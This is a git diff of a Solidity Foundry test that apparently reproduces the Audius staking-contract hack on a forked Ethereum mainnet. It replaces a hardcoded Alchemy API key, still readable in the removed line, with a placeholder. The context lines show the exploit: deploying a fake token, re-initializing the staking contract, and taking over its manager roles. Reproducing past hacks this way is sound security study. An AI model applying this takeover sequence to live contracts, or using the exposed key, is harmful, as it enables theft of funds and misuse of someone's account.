@@ -32,7 +32,7 @@ contract ContractTest is DSTest {
 
     function testAudiusHack() public {
         vm.createSelectFork(
-            "https://eth-mainnet.g.alchemy.com/v2/NsixqnW3NZrQWYxL7uqxtv36t3t6LlfY",
+            "https://eth-mainnet.g.alchemy.com/v2/your-api-key",
             15201700
         );
         console.log("Audius Balance: ", token.balanceOf(address(this)));
@@ -40,7 +40,6 @@ contract ContractTest is DSTest {
         // HACK AWAY! (Don't forget you can use vm.roll(newBlock) to simulate multiple blocks)
         vm.label(address(st), "staking contract");
         FakeERC20Token fk = new FakeERC20Token();
-        vm.roll(block.number + 100);
         st.initialize(address(fk), address(this));
         st.setDelegateManagerAddress(address(this));
         st.setClaimsManagerAddress(address((this)));
